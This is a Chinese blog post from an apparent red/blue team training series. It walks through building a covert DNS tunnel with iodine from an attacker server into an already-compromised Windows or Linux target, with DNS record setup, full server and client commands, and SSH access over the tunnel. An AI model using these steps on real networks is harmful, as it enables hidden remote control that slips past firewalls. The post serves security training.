<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>《红蓝攻防对抗实战》十.内网穿透之利用DNS协议进行隧道穿透 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="《红蓝攻防对抗实战》十.内网穿透之利用DNS协议进行隧道穿透" />
<meta property="og:description" content="一.利用DNS协议进行隧道穿透 1.环境配置2.Windows系统下进行DNS隧道穿透利用3.Linux系统下进行DNS隧道穿透利用 前文推荐：
《红蓝攻防对抗实战》一. 隧道穿透技术详解
《红蓝攻防对抗实战》二.内网探测协议出网之TCP/UDP协议探测出网
《红蓝攻防对抗实战》三.内网探测协议出网之HTTP/HTTPS协议探测出网
《红蓝攻防对抗实战》四.内网探测协议出网之ICMP协议探测出网
《红蓝攻防对抗实战》五.内网探测协议出网之DNS协议探测出网
《红蓝攻防对抗实战》六.常规反弹之利用NC在windows系统执行反弹shell
《红蓝攻防对抗实战》七.常规反弹之利用NC在Linux系统执行反弹shell
《红蓝攻防对抗实战》八.利用OpenSSL对反弹shell流量进行加密
《红蓝攻防对抗实战》九.内网穿透之利用GRE协议进行隧道穿透
一. 利用DNS协议进行隧道穿透 ：
DNS隧道（DNS Tunneling）也是隐蔽隧道的一种方式，通过将其他协议封装在DNS协议中传输建立通信。大部分防火墙和入侵检测设备很少会过滤DNS流量，这就给DNS隧道提供了条件，可以利用它实现诸如远程控制、文件传输的操作。使用dns搭建隧道的工具也有很多，比如dnscat2、DNS2tcp、iodine等。由于iodine工具使用比较稳定，这里使用iodine进行演示，它可以通过一台dns服务器制作一个Ipv4通道，iodine分为客户端和服务端，Iodine不仅有强制密码措施，还支持多种DNS记录类型，而且支持16个并发连接，因此很多时候Iodine是DNS隧道的第一选择。
假设在内网渗透中探测目标服务器，并且我们已经获取到目标服务器主机控制权限，探测DNS协议开放，可以尝试利用DNS隧道工具后续搭建隧道，这里以Iodine工具为案例进行演示，本次实验拓扑如图1-1所示。
图1-1 DNS协议实验拓扑图 1.环境配置 1）使用Iodine工具搭建隧道的前提是有一台服务器和域名，首先进行配置域名解析，为攻击者服务器域名配置两条解析，域名解析配置如图1-2所示，其中A记录类型是告诉dns服务器，域名ns1.xxx.net.cn是由攻击者服务器的公网IP解析，而NS记录类型是告诉dns服务器,域名dc.xxx.net.cn是由dns.ns1.xxx.net.cn解析。
图1-2域名配置 2）如果解析不成功会导致后续DNS隧道无法进行，接下来，我们使用ping命令检测当前环境配置，这里发现可以ping通ns1.xxx.net.cn，说明A记录配置正确，如图1-3所示。
图1-3 ping命令测试配置 3）在攻击者服务器执行tcpdump -n -i eth0 udp dst port 53命令监听本地UDP的53端口。在任意一台主机上执行nslookup dc.xxx.net.cn命令访问域名，如果攻击者服务器监听的端口有查询信息，证明NS记录设置成功，如图1-4所示。
图1-4域名解析配置测试 4）在攻击者服务器进行部署iodine工具，执行yum -y install iodine命令来进行安装，安装完毕后通过执行iodine -v查看版本，如图1-5所示。 图1-5 安装环境 5）下面启动iodine服务端，执行iodined -f -c -P root@Admin123. 192.168.10.1 dc.xxxx.net.cn -DD命令，配置生成虚拟网段，其中-f参数是在前台运行，-c参数禁止检查所有传入请求的客户端IP地址，-P参数指客户端和服务端之间用于验证身份的密码，可以自定义，-D参数指定调试级别，-DD指第二级，&#34;D&#34;的数量随级别增加，这里的IP 192.168.10.1为自定义的虚拟网段，下面实验会通过这个虚拟网段连接服务端，注意网段不要与已存在网段相同，否则会发生冲突连接失败。执行成功则如图1-6所示。
图1-6启动iodine服务端 6）服务端配置成功后会多出一个我们自定义的网卡段，它用来与客户端进行通讯。我们新建一个会话，使用ifconfig命令查看服务器，会发现多出一个虚拟网卡地址，地址为刚设置的地址，如图1-7所示，证明服务端配置成功。
1-7 网卡配置信息 7）我们也可以通过iodine检查页面https://code.kryo.se/iodine/check-it/来检查配置是否正确，输入dc.xxx.net.cn检测，若结果如图1-8所示，则表示设置成功。
图1-8 通过iodine检查页面验证配置成功 2.Windows系统下进行DNS隧道穿透利用 1）下面我们来进行DNS隧道里，假设目标服务器是windows系统，可以使用iodine.exe工具，使用前需要TAP适配器，下载地址为https://swupdate.openvpn.org/community/releases
/openvpn-install-2.4.8-I602-Win10.exe，下载后直接在目标服务器安装，如图1-9所示。
图1-9 安装TAP适配器 2）在目标服务器执行iodine.exe -f -r -P root@Admin123." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/e06813b29d4655aef6ea43d9b458f3ae/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-11-12T09:24:00+08:00" />
<meta property="article:modified_time" content="2023-11-12T09:24:00+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">《红蓝攻防对抗实战》十.内网穿透之利用DNS协议进行隧道穿透</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>一.利用DNS协议进行隧道穿透 </h4> 
 <ul><li><a href="#1_30" rel="nofollow">1.环境配置</a></li><li><a href="#2WindowsDNS_68" rel="nofollow">2.Windows系统下进行DNS隧道穿透利用</a></li><li><a href="#3LinuxDNS_86" rel="nofollow">3.Linux系统下进行DNS隧道穿透利用</a></li></ul> 
</div> 
<p></p> 
<p><strong>前文推荐：</strong></p> 
<p><a href="https://blog.csdn.net/weixin_46192679/article/details/133972767?spm=1001.2014.3001.5501">《红蓝攻防对抗实战》一. 隧道穿透技术详解</a><br> <a href="https://blog.csdn.net/weixin_46192679/article/details/133973785?spm=1001.2014.3001.5501">《红蓝攻防对抗实战》二.内网探测协议出网之TCP/UDP协议探测出网</a><br> <a href="https://blog.csdn.net/weixin_46192679/article/details/133984513?spm=1001.2014.3001.5501">《红蓝攻防对抗实战》三.内网探测协议出网之HTTP/HTTPS协议探测出网</a><br> <a href="https://blog.csdn.net/weixin_46192679/article/details/133996424?spm=1001.2014.3001.5501">《红蓝攻防对抗实战》四.内网探测协议出网之ICMP协议探测出网</a><br> <a href="https://blog.csdn.net/weixin_46192679/article/details/133996604?spm=1001.2014.3001.5501">《红蓝攻防对抗实战》五.内网探测协议出网之DNS协议探测出网</a><br> <a href="https://blog.csdn.net/weixin_46192679/article/details/133997465?spm=1001.2014.3001.5501">《红蓝攻防对抗实战》六.常规反弹之利用NC在windows系统执行反弹shell</a><br> <a href="https://blog.csdn.net/weixin_46192679/article/details/134021383?spm=1001.2014.3001.5501">《红蓝攻防对抗实战》七.常规反弹之利用NC在Linux系统执行反弹shell</a><br> <a href="https://blog.csdn.net/weixin_46192679/article/details/134021948?spm=1001.2014.3001.5501">《红蓝攻防对抗实战》八.利用OpenSSL对反弹shell流量进行加密</a><br> <a href="https://blog.csdn.net/weixin_46192679/article/details/134348526?spm=1001.2014.3001.5502">《红蓝攻防对抗实战》九.内网穿透之利用GRE协议进行隧道穿透</a></p> 
<p><strong>一. 利用DNS协议进行隧道穿透 ：</strong></p> 
<p>DNS隧道（DNS Tunneling）也是隐蔽隧道的一种方式，通过将其他协议封装在DNS协议中传输建立通信。大部分防火墙和入侵检测设备很少会过滤DNS流量，这就给DNS隧道提供了条件，可以利用它实现诸如远程控制、文件传输的操作。使用dns搭建隧道的工具也有很多，比如dnscat2、DNS2tcp、iodine等。由于iodine工具使用比较稳定，这里使用iodine进行演示，它可以通过一台dns服务器制作一个Ipv4通道，iodine分为客户端和服务端，Iodine不仅有强制密码措施，还支持多种DNS记录类型，而且支持16个并发连接，因此很多时候Iodine是DNS隧道的第一选择。<br>假设在内网渗透中探测目标服务器，并且我们已经获取到目标服务器主机控制权限，探测DNS协议开放，可以尝试利用DNS隧道工具后续搭建隧道，这里以Iodine工具为案例进行演示，本次实验拓扑如图1-1所示。<br> <img src="https://images2.imgbox.com/af/ad/AyJqBXpM_o.png" alt="在这里插入图片描述"></p> 
<center>
  图1-1 DNS协议实验拓扑图 
</center> 
<h2><a id="1_30"></a>1.环境配置</h2> 
<p>1）使用Iodine工具搭建隧道的前提是有一台服务器和域名，首先进行配置域名解析，为攻击者服务器域名配置两条解析，域名解析配置如图1-2所示，其中A记录类型是告诉dns服务器，域名ns1.xxx.net.cn是由攻击者服务器的公网IP解析，而NS记录类型是告诉dns服务器,域名dc.xxx.net.cn是由dns.ns1.xxx.net.cn解析。<br><img src="https://images2.imgbox.com/53/8e/Gr1sArsK_o.png" alt=""></p> 
<center>
  图1-2域名配置 
</center> 
<br> 
<p>2）如果解析不成功会导致后续DNS隧道无法进行，接下来，我们使用ping命令检测当前环境配置，这里发现可以ping通ns1.xxx.net.cn，说明A记录配置正确，如图1-3所示。<br><br> <img src="https://images2.imgbox.com/76/a0/FDPhKdjk_o.png" alt="在这里插入图片描述"></p> 
<center>
  图1-3 ping命令测试配置 
</center> 
<br> 
<p>3）在攻击者服务器执行tcpdump -n -i eth0 udp dst port 53命令监听本地UDP的53端口。在任意一台主机上执行nslookup dc.xxx.net.cn命令访问域名，如果攻击者服务器监听的端口有查询信息，证明NS记录设置成功，如图1-4所示。<br><img src="https://images2.imgbox.com/2d/33/YQPk3phU_o.jpg" alt=""> </p> 
<center>
  图1-4域名解析配置测试 
</center> 
<br> 4）在攻击者服务器进行部署iodine工具，执行yum -y install iodine命令来进行安装，安装完毕后通过执行iodine -v查看版本，如图1-5所示。 
<br> 
<img src="https://images2.imgbox.com/1e/99/oakzs2Dt_o.png" alt="在这里插入图片描述"> 
<p></p> 
<center>
  图1-5 安装环境 
</center> 
<br> 
<p>5）下面启动iodine服务端，执行iodined -f -c -P root@Admin123. 192.168.10.1 dc.xxxx.net.cn -DD命令，配置生成虚拟网段，其中-f参数是在前台运行，-c参数禁止检查所有传入请求的客户端IP地址，-P参数指客户端和服务端之间用于验证身份的密码，可以自定义，-D参数指定调试级别，-DD指第二级，"D"的数量随级别增加，这里的IP 192.168.10.1为自定义的虚拟网段，下面实验会通过这个虚拟网段连接服务端，注意网段不要与已存在网段相同，否则会发生冲突连接失败。执行成功则如图1-6所示。<br> <br><img src="https://images2.imgbox.com/6c/25/OOPhLla1_o.png" alt=""></p> 
<center>
  图1-6启动iodine服务端 
</center> 
<br> 
<p>6）服务端配置成功后会多出一个我们自定义的网卡段，它用来与客户端进行通讯。我们新建一个会话，使用ifconfig命令查看服务器，会发现多出一个虚拟网卡地址，地址为刚设置的地址，如图1-7所示，证明服务端配置成功。<br><img src="https://images2.imgbox.com/c6/53/R46Ujic1_o.png" alt=""><br></p> 
<center>
  1-7 网卡配置信息 
</center> 
<br> 
<p>7）我们也可以通过iodine检查页面<a href="https://code.kryo.se/iodine/check-it/" rel="nofollow">https://code.kryo.se/iodine/check-it/</a>来检查配置是否正确，输入dc.xxx.net.cn检测，若结果如图1-8所示，则表示设置成功。<br> <br><img src="https://images2.imgbox.com/cb/b3/wry1RgCy_o.png" alt=""><br></p> 
<center>
  图1-8 通过iodine检查页面验证配置成功 
</center> 
<h2><a id="2WindowsDNS_68"></a>2.Windows系统下进行DNS隧道穿透利用</h2> 
<br> 
<p>1）下面我们来进行DNS隧道里，假设目标服务器是windows系统，可以使用iodine.exe工具，使用前需要TAP适配器，下载地址为<a href="https://swupdate.openvpn.org/community/releases" rel="nofollow">https://swupdate.openvpn.org/community/releases</a><br>/openvpn-install-2.4.8-I602-Win10.exe，下载后直接在目标服务器安装，如图1-9所示。<img src="https://images2.imgbox.com/1e/57/UBqLhOP7_o.png" alt="
"></p> 
<center>
  图1-9 安装TAP适配器 
</center> 2）在目标服务器执行iodine.exe -f -r -P root@Admin123. dc.xxx.net.cn命令，如果出现提示Connection setup complete, transmitting data，就表示DNS隧道已经建立，如图1-10所示。 
<p><img src="https://images2.imgbox.com/17/0a/ZBiLcL2I_o.png" alt=""><br> <br>图1-10客户端连接服务端</p> 
<p><br>3）此时目标服务器会多出一条虚拟网卡，这个网卡就是我们执行后建立的通讯网卡，查看其IP为192.168.10.2，与上述DNS自定义网卡一致，证明搭建隧道成功，如图1-11所示。<br> <br><img src="https://images2.imgbox.com/ed/38/xfPpBQR1_o.png" alt=""></p> 
<center>
  图1-11 网卡IP信息器 
</center> 
<h2><a id="3LinuxDNS_86"></a>3.Linux系统下进行DNS隧道穿透利用</h2> 
<p>假设目标服务器是Linux系统，我们执行操作同上述Windows操作一样，在目标服务器下载Iodine工具后，执行iodine -f -r -P root@Admin123. dc.xxx.net.cn命令，连接攻击者服务器，如图1-12所示。</p> 
<p><img src="https://images2.imgbox.com/3d/d3/yKVnP7Bs_o.png" alt="在这里插入图片描述"></p> 
<p><br><br>此时DNS隧道已经搭建成功，执行ifconfig命令后，得知IP是192.168.10.2，我们可以尝试用攻击者服务器进行对客户端192.168.10.2进行ssh连接，连接成功如图1-13所示。<br><img src="https://images2.imgbox.com/b8/07/Qnu6jwJD_o.png" alt=""><br></p> 
<center>
  图1-3服务端进行对客户端ssh连接 
</center>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/ffbe69c075ac8fb363b24bad83b70602/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">【2023最新】超详细！！！python解决代码报错的四个方法保证看完学会并且解决代码报错</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/32c8fd397fa533b196ce5206976a5e6d/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">从零自制操作系统-第一部分（保护模式）</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>